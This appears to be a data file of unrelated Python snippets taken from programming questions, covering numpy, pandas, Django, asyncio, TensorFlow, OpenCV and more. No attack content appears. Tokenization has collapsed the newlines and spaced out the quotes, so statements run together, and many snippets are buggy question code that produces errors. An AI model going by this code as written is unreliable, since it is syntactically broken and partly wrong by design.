"def test_method ( ) : a = 1 b = 10000 c = 20000 sum1 = sum ( range ( a , b ) ) sum2 = sum ( range ( b , c ) ) return ( sum1 , sum2 ) from functools import wrapsdef timed_decorator ( f ) : @ wraps ( f ) def wrapper ( *args , **kwds ) : start = time.time ( ) result = f ( *args , **kwds ) elapsed = ( time.time ( ) - start ) *1000 logger.debug ( `` f : : { 0 } t : : { 1:0.2f } ms '' .format ( f.__name__ , elapsed ) ) return result return wrapper def test_method ( ) : a = 1 b = 10000 c = 20000 start = time.time ( ) sum1 = sum ( range ( a , b ) ) # timing specific line or lines elapsed = ( time.time ( ) - start ) *1000 logger.debug ( `` This part took : : { 1:0.2f } ms '' .format ( elapsed ) ) sum2 = sum ( range ( b , c ) ) return ( sum1 , sum2 )"
"a = np.arange ( 10000 , dtype=np.double ) p = a.ctypes.data_as ( POINTER ( c_double ) ) p.contentsc_double ( 0.0 )"
"import numpycnts = [ 1,2,3 ] numpy.concatenate ( [ numpy.arange ( cnt ) for cnt in cnts ] ) array ( [ 0 , 0 , 1 , 0 , 1 , 2 ] )"
"l = [ { ' A':1 , ' B':2 , ' C':3 , 'D':4 } , { ' A':5 , ' B':6 , ' C':7 , 'D':8 } , { ' A':1 , ' B':9 , ' C':3 , 'D':10 } ] l = [ { ' A':1 , ' B':2 , ' C':3 , 'D':4 } , { ' A':5 , ' B':6 , ' C':7 , 'D':8 } ]"
"def func ( t , a0 , a1 , a2 , T , tau1 , tau2 ) : if t < T : return a0 + a1 * np.exp ( -t/tau1 ) + a2 * np.exp ( -t/tau2 ) else : return a0 + a1 * np.exp ( -T/tau1 ) * ( 1 - t/tau1 + T/tau1 ) + a2 * np.exp ( -T/tau2 ) * ( 1 - t/tau2 + T/tau2 ) popt , pcov = curve_fit ( func , t1 , d1 )"
"Triangle , pentagonal , and hexagonal numbers are generated by the following formulae : Triangle T_ ( n ) =n ( n+1 ) /2 1 , 3 , 6 , 10 , 15 , ... Pentagonal P_ ( n ) =n ( 3n−1 ) /2 1 , 5 , 12 , 22 , 35 , ... Hexagonal H_ ( n ) =n ( 2n−1 ) 1 , 6 , 15 , 28 , 45 , ... It can be verified that T_ ( 285 ) = P_ ( 165 ) = H_ ( 143 ) = 40755.Find the next triangle number that is also pentagonal and hexagonal . n ( n + 1 ) /2 = a ( 3a - 1 ) /2 = b ( 2b - 1 ) = A ( -1 + sqrt ( 1 + 8*A ) ) /2 ( 1 + sqrt ( 1 + 24*A ) ) /6 ( 1 + sqrt ( 1 + 8*A ) ) /4 from math import *i=10000000while ( 1 ) : i = i + 1 if ( ( ( -1+sqrt ( 1+8*i ) ) /2 ) .is_integer ( ) ) : if ( ( ( 1+sqrt ( 1+24*i ) ) /6 ) .is_integer ( ) ) : if ( ( ( 1+sqrt ( 1+8*i ) ) /4 ) .is_integer ( ) ) : print i break"
"LOCALE_PATHS = ( os.path.join ( BASE_DIR , 'locale ' ) , ) LANGUAGE_CODE = 'en-us'USE_I18N = TrueUSE_L10N = Trueugettext = lambda s : sLANGUAGES = ( ( 'en ' , ugettext ( 'English ' ) ) , ( 'mar ' , ugettext ( 'Marathi ' ) ) , ) from django.views.i18n import javascript_catalogjs_info_dict = { 'packages ' : ( 'phone ' , ) , } urlpatterns = [ url ( r'^phone/ ' , include ( 'phone.urls ' ) ) , url ( r'^jsi18n/ $ ' , javascript_catalog , js_info_dict ) , ] < script type= '' text/javascript '' src= '' /jsi18n/ '' > < /script >"
; https : //uwsgi-docs.readthedocs.io/en/latest/HTTP.htmlhttp = :8080wsgi-file = main.pycallable = wsgi_applicationprocesses = 2enable-threads = truemaster = truereload-mercy = 30worker-reload-mercy = 30log-5xx = truelog-4xx = truedisable-logging = truestats = 127.0.0.1:1717stats-http = truesingle-interpreter= true ; https : //github.com/containous/traefik/issues/615http-keepalive=trueadd-header = Connection : Keep-Alive
"# # # File : car_abc.pxd # cython : infer_types=Truecimport cythoncdef class Japan_Car_ABC : cpdef public char* model cpdef public char* color def __richcmp__ ( Japan_Car_ABC self , Japan_Car_ABC other , int op ) : `` '' '' Ref : http : //docs.cython.org/src/userguide/special_methods.html # rich-comparisons '' '' '' if op==2 : # op==2 is __eq__ ( ) in pure python if self.model==other.model : return True return False else : err_msg = `` op { 0 } is n't implemented yet '' .format ( op ) raise NotImplementedError ( err_msg ) # # # File : car_abc.pyfrom abc import ABCMetaclass Japan_Car_ABC ( object ) : __metaclass__ = ABCMeta def __init__ ( self , model= '' '' , color= '' '' ) : self.model = model self.color = color def __eq__ ( self , other ) : if self.model==other.model : return True return False def __hash__ ( self ) : return hash ( self.model ) from car_abc import Japan_Car_ABCclass Lexus ( Japan_Car_ABC ) : def __init__ ( self , *args , **kwargs ) : bling = kwargs.pop ( `` bling '' , True ) # bling keyword ( default : True ) super ( Lexus , self ) .__init__ ( *args , **kwargs ) self.bling = blingclass Toyota ( Japan_Car_ABC ) : def __init__ ( self , *args , **kwargs ) : super ( Toyota , self ) .__init__ ( *args , **kwargs ) if __name__== '' __main__ '' : gloria_car = Lexus ( model= '' ES350 '' , color= '' White '' ) jeff_car = Toyota ( model= '' Camry '' , color= '' Silver '' ) print ( `` gloria_car.model : { 0 } '' .format ( gloria_car.model ) ) print ( `` jeff_car.model : { 0 } '' .format ( jeff_car.model ) ) print ( `` gloria_car==jeff_car : { 0 } '' .format ( gloria_car==jeff_car ) ) from distutils.core import setupfrom distutils.extension import Extensionfrom Cython.Distutils import build_extext_modules = [ Extension ( `` car_abc '' , [ `` car_abc.py '' ] ) , # Extension ( `` car '' , [ `` car.py '' ] ) , ] setup ( name = `` really build this thing '' , cmdclass = { 'build_ext ' : build_ext } , ext_modules = ext_modules )"
class A : b = B ( ) class B : a = A ( ) class A : passclass B : a = A ( ) A.b = B ( ) @ dataclassclass A : b : B # or ` b : Optional [ B ] ` @ dataclassclass B : a : A # or ` a : Optional [ A ] `
"# I want to do something like this but it throws error if soup.find returns # none because .string is not a method of None.title = soup.find ( `` h1 '' , `` article-title '' ) .string or `` none '' # This works but is both ugly and inefficienttitle = `` none '' if soup.find ( `` h1 '' , `` article-title '' ) is None else soup.find ( `` h1 '' , `` article-title '' ) .string # So instead I 'm using this which feels clunky as welltitle = soup.find ( `` h1 '' , `` article-title '' ) title = `` none '' if title is None else title.string"
"import networkx as nximport matplotlib.pyplot as pltfrom networkx.readwrite import json_graph # # The graph data is loaded from JSON # graph = json_graph.node_link_graph ( input_json ) pos = nx.spring_layout ( graph ) nx.draw ( graph , pos , with_labels=True , node_size=300 ) edge_labels=dict ( [ ( ( u , v , ) , d [ 'weight ' ] ) for u , v , d in graph.edges ( data=True ) ] ) nx.draw_networkx_edge_labels ( graph , pos , edge_labels=edge_labels ) plt.savefig ( `` test.png '' )"
"get_mantissa ( [ 1.565888 , 2.073744 , 2.962492 , 4.52838 , 5.417127 , 7.025337 ] ) # [ 0.565888 , 0.073744 , 0.962492 , 0.52838 , 0.417127 , 0.025337 ]"
C : \Users\user1\Documents\ArcGIS\file1.gdbC : \Users\user2\Documents\ArcGIS\file1.gdbC : \Users\user3\Documents\ArcGIS\file1.gdb
"import networkx as nxG=nx.DiGraph ( ) G.add_node ( 1 , type=1 ) G.add_node ( 2 , type=2 ) G.add_node ( 3 , type=3 ) G.add_edge ( 1,2 , side= '' up '' ) G.add_edge ( 1,3 , side= '' up '' ) G.add_edge ( 2,1 , side= '' down '' ) G.add_edge ( 2,3 , side= '' down '' ) for path in nx.all_simple_paths ( G,1,3 ) : print path"
"> > > import pandas as pd > > > df = pd.DataFrame ( [ [ ' a ' , ' a ' , ' b ' , ' b ' ] , [ 6,7,8,9 ] ] ) .T > > > df A B0 a 61 a 72 b 83 b 9 a b0 6 81 7 9 > > > pd.DataFrame ( { k : df.loc [ df [ ' A ' ] == k , ' B ' ] for k in df [ ' A ' ] .unique ( ) } ) a b0 6 NaN1 7 NaN2 NaN 83 NaN 9"
"class Game ( models.Model ) : start_timestamp = models.DateTimeField ( auto_now_add=False ) end_timestamp = models.DateTimeField ( auto_now_add=False ) date_added = models.DateTimeField ( auto_now_add=True ) class Measurement ( models.Model ) : game = models.ForeignKey ( Game , on_delete=models.PROTECT , related_name='measurements ' ) measurement_type = models.CharField ( max_length=56 ) measurement = models.CharField ( max_length=56 ) timestamp = models.DateTimeField ( auto_now_add=False ) date_added = models.DateTimeField ( auto_now_add=True ) class MeasurementSerializer ( serializers.ModelSerializer ) : timestamp = serializers.DateTimeField ( input_formats= ( [ ' % Y- % m- % d % H : % M : % S. % Z ' , 'iso-8601 ' ] ) , required=False ) class Meta : model = Measurement fields = ( 'measurement_type ' , 'measurement ' , 'timestamp ' ) class GameSerializer ( serializers.ModelSerializer ) : start_timestamp = serializers.DateTimeField ( input_formats= ( [ ' % Y- % m- % d % H : % M : % S. % Z ' , 'iso-8601 ' ] ) ) end_timestamp = serializers.DateTimeField ( input_formats= ( [ ' % Y- % m- % d % H : % M : % S. % Z ' , 'iso-8601 ' ] ) ) measurements = MeasurementSerializer ( many=True ) class Meta : model = Game fields = ( 'id ' , 'start_timestamp ' , 'end_timestamp ' , 'measurements ' ) def create ( self , validated_data ) : measurements = validated_data.pop ( 'measurements ' ) game = Game.objects.create ( **validated_data ) for measurement in measurements : Measurement.objects.create ( game=game , **measurement ) return game class GameList ( generics.ListCreateAPIView ) : queryset = Game.objects.all ( ) serializer_class = GameSerializer $ .ajax ( { url : base_url + '/games/ ' , dataType : `` json '' , data : { `` start_timestamp '' : `` 2016-02-16 14:51:43.000000 '' , `` end_timestamp '' : `` 2016-02-16 14:53:43.000000 '' , `` measurements '' : [ { 'measurement_type ' : 'type1 ' , 'measurement ' : '71 ' , 'timestamp ' : '2016-02-16 14:53:43.000000 ' } , { 'measurement_type ' : 'type1 ' , 'measurement ' : '72 ' , 'timestamp ' : '2016-02-16 14:54:43.000000 ' } , { 'measurement_type ' : 'type1 ' , 'measurement ' : '73 ' , 'timestamp ' : '2016-02-16 14:55:43.000000 ' } , ] } , type : 'POST ' } ) .error ( function ( r ) { } ) .success ( function ( data ) { } ) } ) ; 'emotion_measurements [ 0 ] [ measurement_type ] ' ( 4397175560 ) = { list } [ 'type1 ' ] 'emotion_measurements [ 0 ] [ measurement ] ' ( 4397285512 ) = { list } [ '71 ' ] 'emotion_measurements [ 0 ] [ timestamp ] ' ( 4397285600 ) = { list } [ '2016-02-16 14:53:43.000000 ' ] 'emotion_measurements [ 1 ] [ measurement_type ] ' ( 4397175040 ) = { list } [ 'type1 ' ] 'emotion_measurements [ 1 ] [ measurement ] ' ( 4397285864 ) = { list } [ '72 ' ] 'emotion_measurements [ 1 ] [ timestamp ] ' ( 4397285952 ) = { list } [ '2016-02-16 14:54:43.000000 ' ] 'emotion_measurements [ 2 ] [ measurement_type ] ' ( 4397175040 ) = { list } [ 'type1 ' ] 'emotion_measurements [ 2 ] [ measurement ] ' ( 4397285864 ) = { list } [ '73 ' ] 'emotion_measurements [ 2 ] [ timestamp ] ' ( 4397285952 ) = { list } [ '2016-02-16 14:55:43.000000 ' ] def to_internal_value ( self , data ) : formatted_data = json.dumps ( data ) formatted_data = formatted_data.replace ( `` [ `` , `` '' ) .replace ( `` ] '' , '' '' ) formatted_data = json.loads ( formatted_data ) return formatted_data"
"# ! /usr/bin/env python3 # coding : utf8import npyscreen # contentheaders = [ `` column 1 '' , `` column 2 '' , `` column 3 '' , `` column 4 '' ] entries = [ [ `` a1 '' , `` a2 '' , `` a3 '' , `` a4 '' ] , [ `` b1 '' , `` b2 '' , `` b3 '' , `` b4 '' ] , [ `` c1 '' , `` c2 '' , `` c3 '' , `` c4 '' ] , [ `` d1 '' , `` d2 '' , `` d3 '' , `` d4 '' ] , [ `` e1 '' , `` e2 '' , `` e3 '' , `` e4 '' ] ] # returns a string in which the segments are padded with spaces.def format_entry ( entry ) : return `` { :10 } | { :10 } | { :10 } | { :10 } '' .format ( entry [ 0 ] , entry [ 1 ] , entry [ 2 ] , entry [ 3 ] ) class SecondForm ( npyscreen.Form ) : def on_ok ( self ) : self.parentApp.switchFormPrevious ( ) # add the widgets of the second form def create ( self ) : self.col1 = self.add ( npyscreen.TitleText , name= '' column 1 : '' ) self.col2 = self.add ( npyscreen.TitleText , name= '' column 2 : '' ) self.col3 = self.add ( npyscreen.TitleText , name= '' column 3 : '' ) self.col4 = self.add ( npyscreen.TitleText , name= '' column 4 : '' ) class MainForm ( npyscreen.Form ) : def on_ok ( self ) : self.parentApp.switchForm ( None ) def changeToSecondForm ( self ) : self.parentApp.change_form ( `` SECOND '' ) # add the widgets of the main form def create ( self ) : self.add ( npyscreen.FixedText , value=format_entry ( headers ) , editable=False , name= '' header '' ) for i , entry in enumerate ( entries ) : self.add ( npyscreen.ButtonPress , when_pressed_function=self.changeToSecondForm , name=format_entry ( entry ) ) class TestTUI ( npyscreen.NPSAppManaged ) : def onStart ( self ) : self.addForm ( `` MAIN '' , MainForm ) self.addForm ( `` SECOND '' , SecondForm , name= '' Edit row '' ) def onCleanExit ( self ) : npyscreen.notify_wait ( `` Goodbye ! '' ) def change_form ( self , name ) : self.switchForm ( name ) if __name__ == `` __main__ '' : tui = TestTUI ( ) tui.run ( )"
"from collections import OrderedDictimport pprintmenu = { `` about '' : `` about '' , `` login '' : `` login '' , 'signup ' : `` signup '' } menu = OrderedDict ( menu ) pprint.pprint ( menu.items ( ) ) import syssys.exit ( ) [ ( 'about ' , 'about ' ) , ( 'signup ' , 'signup ' ) , ( 'login ' , 'login ' ) ]"
"from sympy import *sqrt ( -24-70*I ) z = symbols ( `` z '' ) solve ( z ** 2 + ( 1 + I ) * z + ( 6 + 18 * I ) , z )"
"import cv2import pyautoguifaceCascade = cv2.CascadeClassifier ( 'haarcascade_frontalface_default.xml ' ) video_capture = cv2.VideoCapture ( 0 ) while True : # Capture frame-by-frame ret , frame = video_capture.read ( ) gray = cv2.cvtColor ( frame , cv2.COLOR_BGR2GRAY ) faces = faceCascade.detectMultiScale ( gray , scaleFactor=1.3 , minNeighbors=5 , minSize= ( 80 , 80 ) , flags=cv2.cv.CV_HAAR_SCALE_IMAGE ) # print 'faces : ' , faces # Draw a rectangle around the faces for ( x , y , w , h ) in faces : cv2.rectangle ( frame , ( x , y ) , ( x+w , y+h ) , ( 0 , 0 , 255 ) , 3 ) # width , height = pyautogui.size ( ) # cursorx , cursory = pyautogui.position ( ) # posx = width - cursorx # posy = cursory pyautogui.moveTo ( x+w , y+h ) # Display the resulting frame # cv2.imshow ( 'Video ' , frame ) rimg = cv2.flip ( frame,1 ) # invert the object frame cv2.imshow ( `` vertical flip '' , rimg ) if cv2.waitKey ( 1 ) & 0xFF == ord ( ' q ' ) : break # When everything is done , release the capturevideo_capture.release ( ) cv2.destroyAllWindows ( )"
"logging.info ( 'foo\nbar ' ) 2018-03-05 10:51:53 root.main +16 : INFO [ 28302 ] foo import sysimport loggingdef set_up_logging ( level=logging.INFO ) : root_logger = logging.getLogger ( ) root_logger.setLevel ( level ) handler = logging.StreamHandler ( sys.stdout ) handler.setFormatter ( logging.Formatter ( ' % ( asctime ) s % ( name ) s : % ( levelname ) -8s [ % ( process ) d ] % ( message ) s ' , ' % Y- % m- % d % H : % M : % S ' ) ) root_logger.addHandler ( handler ) def main ( ) : set_up_logging ( ) logging.info ( 'foo\nbar ' ) if __name__ == '__main__ ' : main ( )"
"def instagram_realtime_subscribe ( event_slug , topic ) : api = InstagramAPI ( client_id = CLIENT_ID , client_secret = CLIENT_SECRET ) r = api.create_subscription ( object = 'tag ' , object_id = topic , aspect = 'media ' , callback_url = 'http : // < domain > /event/ % s/import/instagram/realtime ' % ( event_slug ) , client_id = CLIENT_ID , client_secret = CLIENT_SECRET ) def import_instagram_rt ( request , slug ) : if request.method == `` GET '' : mode = request.GET.get ( `` hub.mode '' ) challenge = request.GET.get ( `` hub.challenge '' ) verify_token = request.GET.get ( `` hub.verify_token '' ) if challenge : return HttpResponse ( challenge , mimetype='text/html ' ) else : return HttpResponse ( `` test '' , mimetype='text/html ' ) else : x_hub_signature= '' if request.META.has_key ( 'HTTP_X_HUB_SIGNATURE ' ) : x_hub_signature = request.META [ 'HTTP_X_HUB_SIGNATURE ' ] raw_response = request.raw_post_data data = simplejson.loads ( raw_response ) for update in data : fetch_data ( slug , update [ `` object_id '' ] ) url ( r'^event/ ( [ -\w ] + ) /import/instagram/realtime $ ' , import_instagram_rt ) , > > > instagram_realtime_subscribe ( `` cats '' , `` cats '' ) Traceback ( most recent call last ) : File `` < console > '' , line 1 , in < module > File `` /home/ubuntu/webapps/django-projects/imports/views.py '' , line 687 , in instagram_realtime_subscribe client_secret = CLIENT_SECRET File `` /home/ubuntu/webapps/django-projects/local/lib/python2.7/site-packages/instagram/bind.py '' , line 151 , in _call return method.execute ( ) File `` /home/ubuntu/webapps/django-projects/local/lib/python2.7/site-packages/instagram/bind.py '' , line 143 , in execute content , next = self._do_api_request ( url , method , body , headers ) File `` /home/ubuntu/webapps/django-projects/local/lib/python2.7/site-packages/instagram/bind.py '' , line 124 , in _do_api_request raise InstagramAPIError ( status_code , content_obj [ 'meta ' ] [ 'error_type ' ] , content_obj [ 'meta ' ] [ 'error_message ' ] ) InstagramAPIError : ( 400 ) APISubscriptionError-Unable to reach callback URL `` http : // < domain > /event/cats/import/instagram/realtime '' ."
"1. s - > ( a ) M 1.1 M - > ( b ) S # modem reacts on ` a ` as ` b ` ; so next we should send him command B 1.2 M - > ( c ) S # modem responses on ` a ` as ` c ` ; so next we should send him C 2. s - > ( b ) M 2.1 M - > ( g ) S 2.2 M - > ( f ) S ... 2.N M - > ( x ) S ... { a : ( b , c , d ) , b : ( c , 'exit|silence ' ) , c : ( a , 'exit|silence ' ) , d : ( b ) }"
"o = open ( 'mproducts.txt ' , ' w ' ) with open ( 'reviewsNew.txt ' , 'rb ' ) as f1 : for line in f1 : line = line.strip ( ) line2 = line.split ( '\t ' ) o.write ( str ( line ) ) o.write ( `` \n '' ) MemoryError"
"import numpy as nprandoms = np.random.randint ( 0 , 20 , 10000000 ) a = randoms.astype ( np.int ) b = randoms.astype ( np.object ) np.save ( 'd : /dtype=int.npy ' , a ) # 39 mbnp.save ( 'd : /dtype=object.npy ' , b ) # 19 mb !"
if not translation_available ( `` my string '' ) : log_warning_somewhere ( )
"def select_row_from_id ( view , _id , scroll=False , collapse=True ) : `` '' '' _id is from the iders function ( i.e . an ibeis rowid ) selects the row in that view if it exists `` '' '' with ut.Timer ( ' [ api_item_view ] select_row_from_id ( id= % r , scroll= % r , collapse= % r ) ' % ( _id , scroll , collapse ) ) : qtindex , row = view.get_row_and_qtindex_from_id ( _id ) if row is not None : if isinstance ( view , QtWidgets.QTreeView ) : if collapse : view.collapseAll ( ) select_model = view.selectionModel ( ) select_flag = QtCore.QItemSelectionModel.ClearAndSelect # select_flag = QtCore.QItemSelectionModel.Select # select_flag = QtCore.QItemSelectionModel.NoUpdate with ut.Timer ( ' [ api_item_view ] selecting name . qtindex= % r ' % ( qtindex , ) ) : select_model.select ( qtindex , select_flag ) with ut.Timer ( ' [ api_item_view ] expanding ' ) : view.setExpanded ( qtindex , True ) else : # For Table Views view.selectRow ( row ) # Scroll to selection if scroll : with ut.Timer ( 'scrolling ' ) : view.scrollTo ( qtindex ) return row return None"
"sample = { ' a':1 , ' b':2 } print ( sample.__getitem__ ( ' a ' ) ) # 1print ( sample.get ( ' a ' ) ) # 1 class MyDict ( dict ) : def __missing__ ( self , key ) : return 0 def get ( self , key ) : return self [ key ] d = MyDict ( sample ) print ( d [ ' a ' ] ) # 1print ( d [ ' c ' ] ) # 0 class MyDict2 ( dict ) : def __missing__ ( self , key ) : return 0 def __getitem__ ( self , key ) : return self [ key ] d = MyDict2 ( sample ) print ( d [ ' a ' ] ) print ( d [ ' c ' ] ) RecursionError : maximum recursion depth exceeded while calling a Python object"
from sqlalchemy.ext.sqlsoup import SqlSoupu = SqlSoup ( 'postgresql+psycopg2 : //PUBLIC @ unison-db.org:5432/unison ' ) seq = u.pseq.filter ( u.pseq.pseq_id==76 ) .all ( ) # okayaliases = u.pseqalias.filter ( u.pseqalias.pseq_id==76 ) .all ( ) psql -h unison-db.org -U PUBLIC -d unison -c 'select * from pseq where pseq_id=76'psql -h unison-db.org -U PUBLIC -d unison -c 'select * from pseqalias where pseq_id=76 '
"import numpy as npimport tensorflow as tfnp.random.seed ( 1 ) def create_placeholders ( n_H0 , n_W0 , n_C0 , n_y ) : X = tf.placeholder ( tf.float32 , [ None , n_H0 , n_W0 , n_C0 ] ) Y = tf.placeholder ( tf.float32 , [ None , n_y ] ) return X , Ydef initialize_parameters ( ) : tf.set_random_seed ( 1 ) W1 = tf.get_variable ( `` W1 '' , [ 4 , 4 , 3 , 8 ] , initializer=tf.contrib.layers.xavier_initializer ( seed=0 ) ) W2 = tf.get_variable ( `` W2 '' , [ 2 , 2 , 8 , 16 ] , initializer=tf.contrib.layers.xavier_initializer ( seed=0 ) ) parameters = { `` W1 '' : W1 , `` W2 '' : W2 } return parametersdef forward_propagation ( X , parameters ) : W1 = parameters [ 'W1 ' ] W2 = parameters [ 'W2 ' ] Z1 = tf.nn.conv2d ( X , W1 , strides= [ 1 , 1 , 1 , 1 ] , padding='SAME ' ) A1 = tf.nn.relu ( Z1 ) P1 = tf.nn.max_pool ( A1 , ksize= [ 1 , 8 , 8 , 1 ] , strides= [ 1 , 8 , 8 , 1 ] , padding='SAME ' ) Z2 = tf.nn.conv2d ( P1 , W2 , strides= [ 1 , 1 , 1 , 1 ] , padding='SAME ' ) A2 = tf.nn.relu ( Z2 ) P2 = tf.nn.max_pool ( A2 , ksize= [ 1 , 4 , 4 , 1 ] , strides= [ 1 , 4 , 4 , 1 ] , padding='SAME ' ) F2 = tf.contrib.layers.flatten ( P2 ) Z3 = tf.contrib.layers.fully_connected ( F2 , 6 , activation_fn=None ) return Z3tf.reset_default_graph ( ) with tf.Session ( ) as sess : np.random.seed ( 1 ) X , Y = create_placeholders ( 64 , 64 , 3 , 6 ) parameters = initialize_parameters ( ) Z3 = forward_propagation ( X , parameters ) init = tf.global_variables_initializer ( ) sess.run ( init ) a = sess.run ( Z3 , { X : np.random.randn ( 2,64,64,3 ) , Y : np.random.randn ( 2,6 ) } ) print ( `` Z3 = `` + str ( a ) ) Z3 = [ [ -0.44670227 -1.57208765 -1.53049231 -2.31013036 -1.29104376 0.46852064 ] [ -0.17601591 -1.57972014 -1.4737016 -2.61672091 -1.00810647 0.5747785 ] ] Z3 = [ [ 1.44169843 -0.24909666 5.45049906 -0.26189619 -0.20669907 1.36546707 ] [ 1.40708458 -0.02573211 5.08928013 -0.48669922 -0.40940708 1.26248586 ] ] 2018-04-09 23:13:39.954455 : W tensorflow/core/platform/cpu_feature_guard.cc:45 ] The TensorFlow library was n't compiled to use SSE4.2 instructions , but these are available on your machine and could speed up CPU computations.2018-04-09 23:13:39.954495 : W tensorflow/core/platform/cpu_feature_guard.cc:45 ] The TensorFlow library was n't compiled to use AVX instructions , but these are available on your machine and could speed up CPU computations.2018-04-09 23:13:39.954508 : W tensorflow/core/platform/cpu_feature_guard.cc:45 ] The TensorFlow library was n't compiled to use AVX2 instructions , but these are available on your machine and could speed up CPU computations.2018-04-09 23:13:39.954521 : W tensorflow/core/platform/cpu_feature_guard.cc:45 ] The TensorFlow library was n't compiled to use FMA instructions , but these are available on your machine and could speed up CPU computations ."
"col1 col2 col30 3 1 NaN1 NaN 7 8 col1 col2 col30 3 1 , 7 8 import pandas as pdimport numpy as npd = { 'col1 ' : [ `` 3 '' , np.nan ] , 'col2 ' : [ `` 1 '' , `` 7 '' ] , 'col3 ' : [ np.nan , `` 8 '' ] } df = pd.DataFrame ( data=d )"
"def process ( self ) : self.date_start_processing = timezone.now ( ) try : # Try and import CSV ContactCSVModel.import_data ( data=self.filepath , extra_fields= [ { 'value ' : self.group_id , 'position ' : 5 } , { 'value ' : self.uploaded_by.id , 'position ' : 6 } ] ) self._mark_processed ( self.num_records ) except Exception as e : self._mark_failed ( unicode ( e ) ) class ContactCSVModel ( CsvModel ) : first_name = CharField ( ) last_name = CharField ( ) company = CharField ( ) mobile = CharField ( ) group = DjangoModelField ( Group ) contact_owner = DjangoModelField ( User ) class Meta : delimiter = `` ^ '' dbModel = Contact update = { 'keys ' : [ `` mobile '' , `` group '' ] }"
"import numpyvalue = 4a = [ ] x = numpy.arange ( value ) y = numpy.array_split ( x , 2 ) for i in range ( 2 ) : for j in y : a.append ( j.tolist ( ) [ i ] ) print ( a ) [ 0 , 2 , 1 , 3 ] import numpyvalue = 8a = [ ] x = numpy.arange ( value ) y = numpy.array_split ( x , 2 ) for i in range ( 2 ) : for h in range ( 2 ) : for j in y : z = numpy.array_split ( j , 2 ) a.append ( z [ h ] [ i ] ) print ( a ) [ 0 , 4 , 2 , 6 , 1 , 5 , 3 , 7 ]"
"from asyncio import gather , get_event_loop , sleepclass ErrorThatShouldCancelOtherTasks ( Exception ) : passasync def my_sleep ( secs ) : await sleep ( secs ) if secs == 5 : raise ErrorThatShouldCancelOtherTasks ( ' 5 is forbidden ! ' ) print ( f'Slept for { secs } secs . ' ) async def main ( ) : try : sleepers = gather ( * [ my_sleep ( secs ) for secs in [ 2 , 5 , 7 ] ] ) await sleepers except ErrorThatShouldCancelOtherTasks : print ( 'Fatal error ; cancelling ' ) sleepers.cancel ( ) finally : await sleep ( 5 ) get_event_loop ( ) .run_until_complete ( main ( ) ) PS C : \Users\m > .\AppData\Local\Programs\Python\Python368\python.exe .\wtf.pySlept for 2secs.Fatal error ; cancellingSlept for 7secs ."
"import hashlibimport gzipf_name = 'read_x.fastq'for x in range ( 0,3 ) : file = open ( f_name , 'rb ' ) myzip = gzip.open ( 'test.gz ' , 'wb ' , compresslevel=1 ) n = 100000000 try : print 'zipping ' + str ( x ) for chunk in iter ( lambda : file.read ( n ) , `` ) : myzip.write ( chunk ) finally : file.close ( ) myzip.close ( ) md5 = hashlib.md5 ( ) print 'hashing ' + str ( x ) with open ( 'test.gz ' , ' r ' ) as f : for chunk in iter ( lambda : f.read ( n ) , `` ) : md5.update ( chunk ) print md5.hexdigest ( ) print '\n ' zipping 0hashing 07bd80798bce074c65928e0cf9d66cae4zipping 1hashing 1a3bd4e126e0a156c5d86df75baffc294zipping 2hashing 285812a39f388c388cb25a35c4fac87bf hashing 0ccfddd10c8fd1140db0b218124e7e9d3hashing 1ccfddd10c8fd1140db0b218124e7e9d3hashing 2ccfddd10c8fd1140db0b218124e7e9d3"
"import asynciodef coro1 ( ) : for i in range ( 1 , 10 ) : yield idef coro2 ( ) : for i in range ( 1 , 10 ) : yield i*10class Coro : # Not used . def __await__ ( self ) : for i in range ( 1 , 10 ) : yield i * 100 @ asyncio.coroutinedef wrapper1 ( ) : return ( yield from coro1 ( ) ) @ asyncio.coroutinedef wrapper2 ( ) : return ( yield from coro2 ( ) ) for i in wrapper1 ( ) : print ( i ) print ( `` Above result was obvious which I can iterate around a couroutine . `` .center ( 80 , `` # '' ) ) async def async_wrapper ( ) : await wrapper1 ( ) await wrapper2 ( ) loop = asyncio.get_event_loop ( ) futures = [ asyncio.ensure_future ( async_wrapper ( ) ) ] result = loop.run_until_complete ( asyncio.gather ( *futures ) ) print ( result ) loop.close ( ) 123456789 # # # # # # # Above result was obvious which I can iterate around a couroutine. # # # # # # # # # Traceback ( most recent call last ) : File `` stack-coroutine.py '' , line 36 , in < module > result = loop.run_until_complete ( asyncio.gather ( *futures ) ) File `` /usr/lib/python3.6/asyncio/base_events.py '' , line 484 , in run_until_complete return future.result ( ) File `` stack-coroutine.py '' , line 30 , in async_wrapper await wrapper1 ( ) File `` stack-coroutine.py '' , line 18 , in wrapper1 return ( yield from coro1 ( ) ) File `` stack-coroutine.py '' , line 5 , in coro1 yield iRuntimeError : Task got bad yield : 1 110220330 ..."
"a = [ 'no ' , 'no ' , 'no ' , 'yes ' , 'no ' , 'yes ' , 'no ' ] [ 'no ' , 'no ' , 'yes ' , 'yes ' , 'no ' ] a = [ 'no ' , 'no ' , 'no ' , 'yes ' , 'no ' , 'yes ' , 'no ' ] a.remove ( 'no ' ) print a [ 'no ' , 'no ' , 'yes ' , 'no ' , 'yes ' , 'no ' ]"
"a = [ 6,2,3,88,54 , -486 ] b = [ 6,2,3,88,54 , -486 ] a == b > > > True"
"application : myapplicationidversion : demoruntime : python27api_version : 1threadsafe : yeshandlers : - url : / . * script : main.APPlibraries : - name : webapp2 version : latest # -*- coding : utf-8 -*- '' '' '' Memory leak demo . `` `` '' from google.appengine.ext import ndbimport webapp2class DummyModel ( ndb.Model ) : content = ndb.TextProperty ( ) class CreatePage ( webapp2.RequestHandler ) : def get ( self ) : value = str ( 102**100000 ) entities = ( DummyModel ( content=value ) for _ in xrange ( 100 ) ) ndb.put_multi ( entities ) class MainPage ( webapp2.RequestHandler ) : def get ( self ) : `` '' '' Use of ` query ( ) .iter ( ) ` was suggested here : https : //code.google.com/p/googleappengine/issues/detail ? id=9610 Same result can be reproduced without decorator and a `` classic '' ` query ( ) .fetch ( ) ` . `` '' '' for _ in range ( 10 ) : for entity in DummyModel.query ( ) .iter ( ) : pass # Do whatever you want self.response.headers [ 'Content-Type ' ] = 'text/plain ' self.response.write ( 'Hello , World ! ' ) APP = webapp2.WSGIApplication ( [ ( '/ ' , MainPage ) , ( '/create ' , CreatePage ) , ] )"
"import pandas as pddf = pd.DataFrame ( { 'foo ' : rand ( 3 ) , 'future_index ' : [ 22 , 13 , 87 ] } ) df [ 'future_index ' ] = df [ 'future_index ' ] .astype ( 'category ' ) df = df.set_index ( 'future_index ' ) df.loc [ 13 ] TypeError : can not do label indexing on < class 'pandas.core.indexes.category.CategoricalIndex ' > with these indexers [ 13 ] of < class 'int ' > 13 in df.index df.index.get_loc ( 13 )"
